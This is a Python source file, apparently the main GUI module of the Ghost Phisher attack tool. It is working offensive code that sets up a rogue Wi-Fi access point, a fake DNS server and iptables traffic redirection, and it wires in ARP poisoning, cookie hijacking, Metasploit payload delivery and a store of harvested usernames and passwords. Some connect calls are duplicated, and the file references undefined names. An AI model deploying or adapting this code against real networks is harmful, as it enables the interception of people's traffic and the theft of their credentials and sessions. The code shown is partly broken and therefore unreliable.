import os                   # For operating system related call e.g [os.listdir()]
import re                   # String matching
import sys                  # For validating execution of GUI components e.g [QApplication(sys.argv)]
import time                 # For displaying time of executed attacks
import _thread               # For running services in a sub-processed loop(threads)
import socket               # For network based servcies e.g DNS
import signal               # Sending SIGINT signal to processes
import urllib.request, urllib.error, urllib.parse              # For getting the source code of websites that user wants to clone
import sqlite3              # For saving fetched credentials to database
import shutil               # For file copy operations
import subprocess             # For executing shell commands and getting system output e.g DHCP3 and for reading live output from terminal processes


from .settings import *
from .ghost_ui import *
from core.http_core import *
from core import variables
from core.ghost_dns import *
from core import ghost_trap_core
from core import metasploit_payload
from core.update import update_class
from .tip_settings import tip_settings
from .whats_new import whats_new_window
from .font_settings import font_settings

from PyQt6 import QtCore, QtGui, QtWidgets
from PyQt6.QtCore import QUrl
from PyQt6.QtGui import QDesktopServices

from core.MITM_Core import *
from core.mozilla_cookie_core import *
from core.cookie_hijacker_core import *


cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
                                                                         # Thats because the HTTP server changes directory after launch


# os.environ["ghost_trap_http_server"] = "start"

os.environ["ghost_trap_http_server"] = "stop"
os.environ["ghost_fake_http_control"] = "stop"

# os.environ.get("ghost_trap_http_server") == "stop"
# os.environ.get("ghost_trap_http_server") == "start"


#
# Global variables
#
usable_interface_cards = {}                                     # Dictionary holding interface cards and addresses
interface_card_list = []                                        # Holds interface card names

# Global variables for Fake DNS
dns_contol = 1                                                  # Used to control the DNS Service
dns_connections = 0                                             # Display numbers of dns connections on the tab label
dns_ip_and_websites = {}                                        # Holds mappings of fake ip to dns


# Global variables for Fake HTTP
http_server_port = 80                                           # Default HTTP port
http_control = 0                                                # Used to control the credential searching thread

# Global variables for Credential Harvester
captured_credential = 0                                         # Holds the number of captured crdentials

ghost_settings = Ghost_settings()                               # Ghost settings file object


# Ghost Trap HTTP Object
ghost_trap_http = ghost_trap_core.Ghost_Trap_http()             # Ghost Trap HTTP Class


class Ghost_phisher(QtWidgets.QMainWindow, Ui_ghost_phisher):  # Main class for all GUI functional definitions
    new_arp_victim = QtCore.pyqtSignal()
    dns_started_sig = QtCore.pyqtSignal()
    dns_failed_sig = QtCore.pyqtSignal()
    dns_stopped_sig = QtCore.pyqtSignal()

    run_tips_sig = QtCore.pyqtSignal()
    run_whats_new_sig = QtCore.pyqtSignal()

    access_point_output_sig = QtCore.pyqtSignal()
    access_point_error_sig = QtCore.pyqtSignal()
    access_point_started_sig = QtCore.pyqtSignal()

    creating_cache_sig = QtCore.pyqtSignal()
    emit_buffer_red_light_sig = QtCore.pyqtSignal()
    off_sniff_red_light_sig = QtCore.pyqtSignal()
    on_sniff_green_light_sig = QtCore.pyqtSignal()
    continue_sniffing_sig = QtCore.pyqtSignal()

    """Main Class for GUI"""
    def __init__(self):
        super().__init__()

        self.setupUi(self)
        self.retranslateUi(self)
        self.dns_stop.setEnabled(False)
        self.dhcp_stop.setEnabled(False)
        self.http_stop.setEnabled(False)
        self.ghost_spawn_stop.setEnabled(False)
        self.monitor_button.setEnabled(False)
        self.access_stop.setEnabled(False)
        self.access_start.setEnabled(False)
        self.domain_add_button.setEnabled(False)
        self.groupBox_16.setEnabled(False)

        self.lease_count = 0                        # Used with the Ghost DHCP Server to display lease

        self.check_root_privileges_ui()               # Check root priviledges

        self.ghost_dns = Ghost_DNS_Server()        # Ghost DNS Server instance

        # Ghost Trap method constructor calls and variables
        self.encode_number_list()
        self.metasploit_payloads()
        self.metasploit_installation()
        self.display_hint_options()

        self.form_variables = None
        self.fake_http_object = None
        self.custom_spawn_page_path = None

        self.custom_windows_exec_path = None
        self.custom_linux_exec_path = None

        self.dhcp_cache ={}
        self.ghost_dhcp_server = object     # Ghost DHCP Server instance
        self.displayed_hostname = set()     # Holds unique Hostnames that have been leased addresses
        self.scapy_IsInstalled()            # Checks if the scapy library is installed


        self.metasploit_payload_choice()
        self.vulnarabilty_page_choice()

        self.red_led = "%s/gui/images/red_led.png"%(cwd)
        self.green_led = "%s/gui/images/green_led.png"%(cwd)

        # Thread execute Tip settings dialog after 5 seconds
        _thread.start_new_thread(self.run_whats_new_thread,())
        _thread.start_new_thread(self.run_tips_thread,())

        # Get data from database from initialization
        global previous_database_data


        # Metasploit Class object
        self.metasploit_object = metasploit_payload.metasploit()             #  Metasploit Thread class
        self.update_function = update_class()

        previous_database_data = self.fetch_data()

        # Each entry is expected to look like: (website, username, password)
        for iterate, current_credential in enumerate(previous_database_data):
            # Skip malformed rows safely
            if not current_credential or len(current_credential) < 3:
                continue

            self.credential_table.insertRow(iterate)

            website = QtWidgets.QTableWidgetItem(str(current_credential[0]))
            username = QtWidgets.QTableWidgetItem(str(current_credential[1]))
            password = QtWidgets.QTableWidgetItem(str(current_credential[2]))

            self.credential_table.setItem(iterate, 0, website)
            self.credential_table.setItem(iterate, 1, username)
            self.credential_table.setItem(iterate, 2, password)

        installation_status_access = subprocess.getstatusoutput('which airbase-ng')
        if installation_status_access[0] != 0:
            self.refresh_button.setEnabled(False)
            self.access_textbrowser.append('<font color=green>Airbase-ng is not installed,to get airbase-ng run:</font>\t<font color=red>apt-get install aircrack-ng</font>')

        #
        # Read settings files and append their corresponding last settings to their input area
        #
        if ghost_settings.setting_exists('self.dns_ip_address'):
            self.dns_ip_address.setText(ghost_settings.read_last_settings('self.dns_ip_address'))

        if ghost_settings.setting_exists('self.start_ip'):
            self.start_ip.setText(ghost_settings.read_last_settings('self.start_ip'))

        if ghost_settings.setting_exists('self.subnet_ip'):
            self.subnet_ip.setText(ghost_settings.read_last_settings('self.subnet_ip'))

        if ghost_settings.setting_exists('self.stop_ip'):
            self.stop_ip.setText(ghost_settings.read_last_settings('self.stop_ip'))

        if ghost_settings.setting_exists('self.fakedns_ip'):
            self.fakedns_ip.setText(ghost_settings.read_last_settings('self.fakedns_ip'))

        if ghost_settings.setting_exists('self.gateway_ip'):
            self.gateway_ip.setText(ghost_settings.read_last_settings('self.gateway_ip'))

        if ghost_settings.setting_exists('self.alternatedns_ip'):
            self.alternatedns_ip.setText(ghost_settings.read_last_settings('self.alternatedns_ip'))

        if ghost_settings.setting_exists('self.website_linedit'):
            self.website_linedit.setText(ghost_settings.read_last_settings('self.website_linedit'))

        if ghost_settings.setting_exists('ip_address_label_2'):
            self.ip_address_label_2.setText(ghost_settings.read_last_settings('ip_address_label_2'))

        if ghost_settings.setting_exists('lineEdit_2'):
            self.lineEdit_2.setText(ghost_settings.read_last_settings('lineEdit_2'))

        if ghost_settings.setting_exists('access_name_edit'):
            self.access_name_edit.setText(ghost_settings.read_last_settings('access_name_edit'))


        if ghost_settings.setting_exists("self.wep_key_edit_2"):
            self.wep_key_edit_2.setText(ghost_settings.read_last_settings("self.wep_key_edit_2"))


        if ghost_settings.setting_exists("self.wep_key_edit_3"):
            self.wep_key_edit_3.setText(ghost_settings.read_last_settings("self.wep_key_edit_3"))


        if ghost_settings.setting_exists('self.linux_exec_edit'):
            self.linux_exec_checkbox.setChecked(True)
            self.linux_exec_edit.setText(ghost_settings.read_last_settings('self.linux_exec_edit'))
        else:
            self.linux_exec_checkbox.setChecked(False)


        if ghost_settings.setting_exists("self.windows_exec_edit"):
            self.windows_exec_checkbox.setChecked(True)
            self.windows_exec_edit.setText(ghost_settings.read_last_settings("self.windows_exec_edit"))
        else:
            self.windows_exec_checkbox.setChecked(False)



        global usable_interface_cards
        global interface_cards_http
        global interface_cards

        card_list = os.listdir('/sys/class/net')                        # Directory contains list of interface cards
        terminal_output = subprocess.getstatusoutput('ifconfig')[1]

        for iterate in card_list:
            if iterate in terminal_output:
                if iterate != 'lo':                                     # Skip default loopback address name cause that will be manually defined
                    interface_card_list.append(iterate)

        for available_cards in interface_card_list:
            ip_output = subprocess.getstatusoutput('ifconfig %s | grep \'s\''%(available_cards))
            interface_list  = ip_output[1].splitlines()
            process_interface_list = interface_list[0].strip(' ')
            try:
                index_number = process_interface_list.index('Bcast:')
                ip_address = process_interface_list[0:index_number].strip('Mask: inet addr: ')
                usable_interface_cards[available_cards] = ip_address        # Add interfaces cards and IP addresses to dictionary
            except ValueError:
                if 'Mask:' in process_interface_list:
                    index_number = process_interface_list.index('Mask:')
                    ip_address = process_interface_list[0:index_number].strip('Mask: inet addr: ')
                    usable_interface_cards[available_cards] = ip_address

                #Else will not add card if card does not have Ip flags

        usable_interface_cards['Default Route Address'] = '0.0.0.0'                 # Add default route address to dictionary
        usable_interface_cards['Loopback Address'] = '127.0.0.1'                    # Adds the loopback address to the dictionary

        interface_cards = list(usable_interface_cards.keys())
        interface_cards_http = list(usable_interface_cards.keys())
        interface_cards.sort()
        interface_cards.reverse()

        # Add iterface card names to the DNS interface combo and HTTP combo

        # HTTP Server runs on default route by default,"0.0.0.0" will cause problems if used on the forms action POST e.g action="http://0.0.0.0/"
        # therefore the program uses another interfaces ip address for the action posts
        interface_cards_http.remove('Default Route Address')
        interface_cards_http.reverse()

        self.card_interface_combo.addItems(interface_cards)
        self.http_interface_combo.addItems(interface_cards_http)

        self.spawn_http_interface_combo.addItems(interface_cards)

        interface_card_ip = []                                                      # List holding Ip addresses derived from the dictionary
        selected_interface = str(self.card_interface_combo.currentText())
        interface_card_ip.append(usable_interface_cards[selected_interface])

        self.ip_address_combo.addItems(interface_card_ip)                           #Adds the IP address of the First Card to DNS IP combo
        self.http_ip_combo.addItems(interface_card_ip)           #Adds the IP address of the First Card to HTTP IP combo
        self.spawn_ip_combo.addItems(interface_card_ip)             # Adds the IP address of the First Card to the Ghost Spawn combo

        self.port_setting_edit.setText("4444")
        self.ghost_trap_http_edit.setText("80")
        self.ip_address_edit.setText(self.spawn_ip_combo.currentText())


        self.current_card_label.setText("<font color=green>Current Interface:</font>  %s"%(selected_interface))


        # Add channel list to fake access point combo
        channels = []
        for iterate in range(1,14):
            channels.append(str(iterate))

        self.channel_combo.addItems(channels)

        ##################  SESSION HIJACKING FUNCTIONS ########################
        self.interface_card_info = {}               # {eth0:ETHERNET, wlan0:WIFI}

        self.enable_control(False)
        self.Right_click_Menu()                     # Activate right click menu items
        self.is_mozilla_cookie_truncated = False    # Deletes all previous cookies in mozilla database

        self.monitor_interface = str()              # wlan0, mon0 etc

        self.interface_selection_control_session = True

        self.red_light = QtGui.QPixmap("%s/gui/images/red_led.png"%(os.getcwd()))
        self.green_light = QtGui.QPixmap("%s/gui/images/green_led.png"%(os.getcwd()))

        self.refresh_interface()                    # Display list of wireless interface cards on startup
        self.clear_items()                          # Clear design items from cookie tree widget

        self.host_interface = str()                 # Hold the name of the current monitor host interface e.g wlan0

        self.mitm_pid = int()
        self.cookie_db_jar = object                             # Sqlite3 Database object
        self.cookie_core = Cookie_Hijack_Core()                 # Cookie Capture and processing core
        self.mozilla_cookie_engine = Mozilla_Cookie_Core()      # Mozilla fierfox cookie engine

        self.refresh_button_3.clicked.connect(self.refresh_interface)
        self.start_sniffing_button_3.clicked.connect(self.start_Cookie_Attack)

        self.ethernet_mode_radio_2.clicked.connect(self.set_attack_option)
        self.passive_mode_radio_2.clicked.connect(self.set_attack_option)

        self.stop_sniffing_button_3.clicked.connect(self.stop_Cookie_Attack)

        # QComboBox: pick ONE of these depending on what your reset() expects
        self.combo_interface_2.currentIndexChanged.connect(self.reset)          # sends int
        # or:
        self.combo_interface_2.currentTextChanged.connect(self.reset)          # sends str

        self.connect_objects()

        ##################  ARP POISONING  FUNCTIONS ########################

        self.arp_victims = set()
        self.interface_selection_control = True
        self.arp_attack = Fern_MITM_Class.ARP_Poisoning()

        self.refresh_interface_arp()

        self.refresh_button_4.clicked.connect(self.refresh_interface_arp)
        self.start_arp_poison.clicked.connect(self.start_arp_poison_attack)
        self.stop_arp_poison.clicked.connect(self.stop_arp_poison_attack)

        # QComboBox: choose based on what interface_filter expects
        self.combo_interface_3.currentIndexChanged.connect(self.interface_filter)   # sends int
        # or:
        self.combo_interface_3.currentTextChanged.connect(self.interface_filter)    # sends str

        # Custom signal: you must define it as a pyqtSignal in the class
        self.new_arp_victim.connect(self.display_arp_victim_info)

        #####################################################################
        #
        # Connection to GUI object slots and Signals
        #
        self.card_interface_combo.currentTextChanged.connect(lambda _t: self.update_dns_address())
        self.http_interface_combo.currentTextChanged.connect(lambda _t: self.update_http_address())
        self.spawn_http_interface_combo.currentTextChanged.connect(lambda _t: self.update_ghost_spawn_interfaces())

        self.resolveall_radio.clicked.connect(self.update_selection)
        self.respond_domain_radio.clicked.connect(self.update_selection)

        self.dns_stop.clicked.connect(self.stop_dns)
        self.dns_start.clicked.connect(self.launch_dns)

        self.dhcp_start.clicked.connect(self.launch_dhcp)
        self.website_button.clicked.connect(self.browse_webpage)

        self.emulate_website_radio.clicked.connect(self.set_usable)
        self.select_website_radio.clicked.connect(self.set_usable)

        self.http_stop.clicked.connect(self.stop_http)
        self.http_start.clicked.connect(self.launch_http_server)

        self.dhcp_stop.clicked.connect(self.stop_dhcp)

        self.insert_button.clicked.connect(self.insert_credential)
        self.delete_button.clicked.connect(self.delete_credential)
        self.savechanges_button.clicked.connect(self.save_changes)

        self.start_ip.textChanged.connect(lambda _t: self.determine_subnet())

        self.domain_add_button.clicked.connect(self.ip_to_website)
        self.refresh_button.clicked.connect(self.refresh_card)

        self.access_start.clicked.connect(self.launch_Access_Point)

        self.comboBox.currentTextChanged.connect(lambda _t: self.card_details())

        self.monitor_button.clicked.connect(self.set_monitor)

        self.dns_started_sig.connect(self.dns_started)
        self.dns_failed_sig.connect(self.dns_failed)
        self.dns_stopped_sig.connect(self.stop_dns)
        self.ghost_dns.new_client_connection.connect(self.update_dns_connections)
        self.run_tips_sig.connect(self.run_tips)
        self.run_whats_new_sig.connect(self.run_what_new)

        self.access_point_output_sig.connect(self.update_access_output)
        self.access_point_error_sig.connect(self.update_access_error)
        self.access_point_started_sig.connect(self.access_point_started)
        self.access_stop.clicked.connect(self.stop_access_point)
        self.rouge_radio.clicked.connect(self.clear_key_area)

        self.ghost_vul_combo.clicked.connect(self.vulnarabilty_page_choice)
        self.custom_vul_combo.clicked.connect(self.vulnarabilty_page_choice)

        self.metasploit_payload_radio.clicked.connect(self.metasploit_payload_choice)
        self.custom_payload_radio.clicked.connect(self.custom_payload_choice)

        self.custom_page_button.clicked.connect(self.browse_custom_webpage)
        self.windows_exec_button.clicked.connect(self.custom_windows_executable_payload)
        self.linux_exec_button.clicked.connect(self.custom_linux_executable_payload)

        self.ghost_spawn_start.clicked.connect(self.launch_ghost_trap)
        self.ghost_spawn_stop.clicked.connect(self.ghost_trap_stop)

        ghost_trap_http.got_new_connection.connect(self.display_new_connection)
        ghost_trap_http.new_download.connect(self.new_download)

        self.update_function.new_update_available.connect(self.update_window)

        # Start Update checker
        _thread.start_new_thread(self.update_function.update_initializtion_check,())

        self.display_ghost_version()        # Display Ghost Version number on mainwindow e.g V1.45
        self.centralize_window()



    #########################################################################
    #                           GUI DISPLAY CODES                           #
    #########################################################################

    def display_hint_options(self):
        try:
            self.setWindowFlags(
                self.windowFlags()
                | QtCore.Qt.WindowType.WindowMaximizeButtonHint
                | QtCore.Qt.WindowType.WindowCloseButtonHint
                | QtCore.Qt.WindowType.WindowMinimizeButtonHint
            )
        except:
            pass


    def display_ghost_version(self):
        version_number = str(self.update_function.current_version)
        self.ghost_phisher_version_label.setText("V" + version_number)



    def centralize_window(self):
        self.setWindowFlags(QtCore.Qt.WindowType.Dialog)



    #########################################################################
    #                           TIPS AND FONT SETTINGS                      #
    #########################################################################

    def check_root_privileges_ui(self):
        if os.getenv("LOGNAME", "none").lower() != "root":
            QtWidgets.QMessageBox.warning(
                self,
                "Insufficient Privileges",
                "Ghost Phisher requires root priviledges to function properly, "
                "please run as root.",
            )
            sys.exit(1)


    def update_window(self):
        self.update_function.display_update_version()
        self.update_function.exec()


    def keyPressEvent(self, event):
        """Runs the font dialog window when user presses F2"""
        if event.key() == QtCore.Qt.Key.Key_F2:
            font_run = font_settings()
            font_run.exec()


    def run_tips_thread(self):
        ''' thread component emits
            signal to evaluate execution
            of tips dialog after 2 seconds
        '''
        time.sleep(2)
        self.run_tips_sig.emit()


    def run_whats_new_thread(self):
        time.sleep(2)
        self.run_whats_new_sig.emit()


    def run_tips(self):
        ''' Run tips dialog and display
            to user useful information
            on usage
        '''
        run_tips = tip_settings()
        if setting_file.setting_exists('tip-settings'):
            if int(ghost_settings.read_last_settings('tip-settings')) == 1:
                run_tips.exec()
        else:
            run_tips.exec()

    def run_what_new(self):
        run_what_new = whats_new_window()
        if setting_file.setting_exists("disable whats new window"):
            if ghost_settings.read_last_settings("disable whats new window") == "True":
                run_what_new.exec()
        else:
            run_what_new.exec()




    #########################################################################
    #               FAKE AP  DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def refresh_card(self):
        ''' function checks for wireless
            interface cards connected
        '''
        # Stop monitor mode on all interfaces (just like airmon-ng likes it)
        for disable_monitor in os.listdir('/sys/class/net'):
            subprocess.getstatusoutput(f'airmon-ng stop {disable_monitor}')
    
        # Get compatible wireless cards
        compatible_cards = subprocess.getstatusoutput(
            "airmon-ng | grep -E '^[a-z]{2,4}[0-9]'"
        )[1]
    
        self.comboBox.clear()
    
        if compatible_cards:
            card_list = []
    
            for cards in os.listdir('/sys/class/net'):
                if cards in compatible_cards and cards not in card_list:
                    card_list.append(cards)
    
            self.comboBox.addItems(card_list)
            self.access_textbrowser.clear()
            self.monitor_button.setEnabled(True)
            self.card_details()
        else:
            self.access_textbrowser.clear()
            self.access_textbrowser.append(
                '<font color=red>No wireless interface card detected</font>'
            )

    def card_details(self):
        global mac_address
        selected_card = str(self.comboBox.currentText())
        if selected_card != '':
            compatible_cards = subprocess.getstatusoutput("airmon-ng | grep -E '^[a-z]{2,4}[0-9]'")[1]
            card_process = compatible_cards.splitlines()
            for card_detail in card_process:
                if selected_card in str(card_detail):
                    self.acess_interface.setText('Current Interface:&nbsp;<font color=green> %s</font>'%(card_detail.split()[0]))
                    self.driver_label.setText('Driver:&nbsp;<font color=green> %s</font>'%(card_detail.split()[2]))
                    mac_process = open('/sys/class/net/%s/address'%(selected_card))
                    mac_address = mac_process.read().strip('\n')
                    self.mac_address_label.setText('Mac Address:&nbsp;<font color=green> %s</font>'%(mac_address))
                    self.monitor_label.setText('Monitor:&nbsp;<font color=red>Not Started</font>')
                    self.monitor_button.setEnabled(True)
                    mac_process.close()


    def set_monitor(self):
        global monitor
        selected_card = str(self.comboBox.currentText())
        attempt_monitor = subprocess.getstatusoutput("airmon-ng start %s"%(selected_card))
        mon_string = ''
        if attempt_monitor[0] == 0:
            if 'monitor mode enabled' in attempt_monitor[1]:
                for iterate in os.listdir('/sys/class/net'):
                    if iterate.startswith('mon'):
                        mon_string += iterate
                        break
                if mon_string == '':
                    monitor = selected_card
                else:
                    monitor = mon_string

                self.monitor_label.setText('Monitor:&nbsp;<font color=green> %s</font>'%(monitor))
                self.monitor_button.setEnabled(False)
                self.groupBox_16.setEnabled(True)
                self.access_start.setEnabled(True)
        else:
            self.access_textbrowser.append('<font color=red>Failed to set %s on monitor mode: %s</font>'%(selected_card,attempt_monitor[1]))


    def launch_Access_Point(self):
        global access_name
        global access_point_ip
        global encryption_key
        global access_point_control

        access_point_control = 1
        access_name = str(self.access_name_edit.text())
        access_point_ip = str(self.ip_address_label_2.text())
        encryption_key = str(self.lineEdit.text())

        if 'access_point_log' in os.listdir('/tmp/'):
            os.remove('/tmp/access_point_log')

        if access_name == '':
            QtWidgets.QMessageBox.warning(self,"NULL Access Point Name","Please input a name you intend to name the access point e.g Rouge-WIFI")
            access_point_control = 0
        elif access_point_ip.count('.') < 3:
            access_point_control = 0
            QtWidgets.QMessageBox.warning(self,"Invalid IP address","Please input a valid IP address in the (Access Point Name:) section")
        elif self.wpa_radio.isChecked():
            if encryption_key == '':
                access_point_control = 0
                QtWidgets.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")
        elif self.wep_radio.isChecked():
            if encryption_key == '':
                access_point_control = 0
                QtWidgets.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")

        if access_point_control != 0:
            self.access_textbrowser.append('<font color=green>Starting Fake Access Point...</font>')
            _thread.start_new_thread(self.rouge_launch,())
            _thread.start_new_thread(self.update_browser_thread,())


    def clear_key_area(self):
        self.lineEdit.clear()


    def update_access_error(self):
        global access_point_error
        self.access_textbrowser.clear()
        self.access_start.setEnabled(True)
        self.access_stop.setEnabled(False)
        self.access_textbrowser.append('<font color=red>Unable to start Fake AP: %s</font>'%(access_point_error))


    def update_access_output(self):
        global mac_address

        self.access_textbrowser.clear()
        try:
            access_point_file = open('/tmp/access_point_log')
            access_point_output = access_point_file.read()
            if access_point_output.count('Client') != 0:
                self.access_connection_label.setText('Connections:<font color=green> %s</font>'\
                                                     %(str(access_point_output.count('Client'))))
            for iterate in access_point_output.splitlines():
                self.access_textbrowser.append('<font color=green> %s</font>'%(iterate))
            access_point_file.close()
        except IOError:
            self.stop_access_point()


    def access_point_started(self):
        global essid
        global ip_address_text

        self.groupBox_16.setEnabled(False)
        self.access_point_label.setText('Acess Point Name:<font color=green>  %s</font>'%(essid))
        self.channel_label.setText('Channel:<font color=green> %s</font>'%(channel))
        self.ip_address_label.setText('IP address:<font color=green> %s</font>'%(ip_address_text))
        self.access_runtime.setText('Runtime:<font color=green> %s</font>'%(time.ctime()))
        self.main_mac_address_label.setText('Mac Address:<font color=green> %s</font>'%(mac_address))
        self.access_start.setEnabled(False)
        self.access_stop.setEnabled(True)
        ghost_settings.create_settings('self.access_name_edit',essid)
        ghost_settings.create_settings('ip_address_label_2',ip_address_text)

        # Gives Acess point connection client internet access
        filter_interface = ['Default Route Address','Loopback Address']
        for iterate in list(usable_interface_cards.keys()):
            if iterate not in filter_interface:
                subprocess.getstatusoutput("""iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000"""%\
                                               (iterate,usable_interface_cards[iterate])
                                               )


        usable_interface_cards['at0']= ip_address_text

        access_interface = []
        for iterate in list(usable_interface_cards.keys()):
            access_interface.append(iterate)
        access_interface.sort()
        access_interface.reverse()

        self.card_interface_combo.clear()
        self.card_interface_combo.addItems(access_interface)

        interface_cards_httpa = []
        for iterate2 in list(usable_interface_cards.keys()):
            if iterate2 != 'Default Route Address':
                interface_cards_httpa.append(iterate2)

        interface_cards_httpa.sort()
        interface_cards_httpa.reverse()

        self.http_interface_combo.clear()
        self.http_interface_combo.addItems(interface_cards_httpa)

        self.spawn_http_interface_combo.clear()
        self.spawn_http_interface_combo.addItems(interface_cards_httpa)





    def stop_access_point(self):
        global access_point_control
        access_point_control = 0
        if 'access_point_log' in os.listdir('/tmp/'):
            os.remove('/tmp/access_point_log')
        subprocess.getstatusoutput('killall airbase-ng')
        self.groupBox_16.setEnabled(True)
        self.access_point_label.setText('Acess Point Name:')
        self.channel_label.setText('Channel:')
        self.ip_address_label.setText('IP address:')
        self.access_runtime.setText('Runtime:')
        self.main_mac_address_label.setText('Mac Address:')
        self.access_textbrowser.append('<font color=red>Access Point Stopped at: %s</font>'%(time.ctime()))
        self.access_start.setEnabled(True)
        self.access_stop.setEnabled(False)



    def rougue_launch_phase(self):
        global ip_address_text

        period_number = ip_address_text.index('.')
        first_octect = ip_address_text[0:period_number]
        if int(first_octect) in range(1,127):               # Class A IP address (netmask will be 255.0.0.0)
            netmask = '255.0.0.0'
        elif int(first_octect) in range(128,191):           # Class B IP address (netmask will be 255.255.0.0)
            netmask = '255.255.0.0'
        else:
            netmask = '255.255.255.0'

        while 'access_point_log' not in os.listdir('/tmp/'):
            time.sleep(3)
        subprocess.getstatusoutput('ifconfig at0 up')
        subprocess.getstatusoutput('ifconfig at0 %s netmask %s'%(ip_address_text,netmask))
        self.access_point_started_sig.emit()




    def rouge_launch(self):
        global essid
        global channel
        global mac_address
        global ip_address_text
        global access_point_control
        global monitor
        global access_point_error


        essid = str(self.access_name_edit.text())
        channel = str(self.channel_combo.currentText())
        ip_address_text = str(self.ip_address_label_2.text())
        key = str(self.lineEdit.text())

        _thread.start_new_thread(self.rougue_launch_phase,())

        if self.rouge_radio.isChecked():
            output = subprocess.getstatusoutput("airbase-ng -a %s -e '%s' -c %s %s > /tmp/access_point_log"%(mac_address,essid,channel,monitor))
        elif self.wep_radio.isChecked():
            output = subprocess.getstatusoutput("airbase-ng -a %s -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
        else:
            output = subprocess.getstatusoutput("airbase-ng -a %s -z 2 -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))



        if output[0] > 0:
            access_point_error = output[1]
            access_point_control = 0
            self.access_point_error_sig.emit()




    def update_browser_thread(self):
        global access_point_control
        while access_point_control ==  1:
            time.sleep(3)
            self.access_point_output_sig.emit()






    #########################################################################
    #       FAKE DNS SERVER DEFINITION ,FUNCTIONS AND SIGNALS               #
    #########################################################################

    def update_dns_address(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of interface combo
        '''
        global usable_interface_cards

        ip_address = []             #Holds ip address of the selected card

        selected_interface = str(self.card_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_interface])
        except KeyError:
            pass
        self.ip_address_combo.clear()                                       #clear the ip address combo
        self.ip_address_combo.addItems(ip_address)                          #display ip address on combo
        self.current_card_label.setText("<font color=green>\
                                        Current Interface:</font>  %s"%(selected_interface))

    def update_selection(self):
        ''' Disables un-used settings buttons if
            not selected
        '''
        if self.resolveall_radio.isChecked():
            self.domain_add_button.setEnabled(False)
        else:
            self.domain_add_button.setEnabled(True)



    def dns_started(self):
        self.dns_connection_label.setText('Connections:')
        self.dns_textbrowser.append('<font color=green>Started DNS Service at %s'%(time.ctime()))
        self.label_5.setText("<font color=green>Runtime:</font> %s"%(time.ctime()))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> %s"%\
                                           (str(self.ip_address_combo.currentText())))
        self.dns_textbrowser.append(" ")


    def update_dns_connections(self):
        inform = self.ghost_dns.inform
        self.announce_client(inform[0],inform[1])
        self.dns_connection_label.setText('Connections:<font color=green>\t %s</font>'%(self.ghost_dns.connection))


    def announce_client(self,client_hostname,address):
        global selected_dns_ip_address
        if len(address) > 2:
            self.dns_textbrowser.append('<font color=blue>%s just got our Fake IP address for %s</font>'%(client_hostname,address))
        else:
            self.dns_textbrowser.append('<font color=blue>%s just got our Fake IP address</font>'%(client_hostname))


    def stop_dns(self):
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        self.ghost_dns.stop_DNS()
        self.ghost_dns.terminate()
        self.ghost_dns = Ghost_DNS_Server()

        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>DNS Service stopped at %s'%(time.ctime()))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")


    def dns_failed(self):
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>DNS Server failed to start: %s'%(exception))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")


    def ip_to_website(self):
        ''' maps fake ip address to corresponding
            websites in the global dictionary
        '''
        domain_ip_address = str(self.domain_ip.text())
        website_address = str(self.domain_label.text())
        if domain_ip_address.count('.') != 3:                                   # Check if inputed data is valid
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please input a valid Fake IP address to map to website")
        elif len(website_address) < 3:
            QtWidgets.QMessageBox.warning(self,"Invalid Web Address","Please input a web address to map to IP address")
        else:
            self.ghost_dns.mapping[website_address] = domain_ip_address
            self.dns_textbrowser.append('<font color=green>Added \'%s\' resolving as %s</font>'%(website_address,domain_ip_address))
            self.domain_ip.clear()
            self.domain_label.clear()



    def launch_dns(self):
        ''' Launches DNS attack pending on the
            option selected from the radio
            buttons
        '''
        self.ghost_dns.interface = str(self.card_interface_combo.currentText())
        self.ghost_dns.new_client_connection.connect(self.update_dns_connections)

        if self.resolveall_radio.isChecked():
            if str(self.dns_ip_address.text()).count('.') != 3:                 #Check if ip address area is empty
                QtWidgets.QMessageBox.warning(self,'Invalid Resolution IP Address','Please input a valid Fake IP address of which you want the dns to resolve client queries')
            else:
                fake_dns_resolution_ip = str(self.dns_ip_address.text())
                self.ghost_dns.set_DNS_Mode("SINGLE")
                self.ghost_dns.single = fake_dns_resolution_ip

                ghost_settings.create_settings('self.dns_ip_address',fake_dns_resolution_ip)       # Write settings to last settings file

                self.dns_textbrowser.clear()
                self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                self.dns_start.setEnabled(False)
                self.dns_stop.setEnabled(True)
                self.ghost_dns.start()
                self.dns_started_sig.emit()

        else:
            try:
                list(self.ghost_dns.mapping.keys())[0]
                self.ghost_dns.set_DNS_Mode("MAPPING")
                self.dns_textbrowser.clear()
                self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                self.dns_start.setEnabled(False)
                self.dns_stop.setEnabled(True)
                self.ghost_dns.start()                  # DNS Server thread
                self.dns_started_sig.emit()
            except IndexError:
                QtWidgets.QMessageBox.warning(self,"Empty IP to Website address mappings","Seems you forgot to add websites and IP addresses using the (Add) button")
                self.domain_add_button.setFocus()




    #########################################################################
    #       FAKE DHCP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

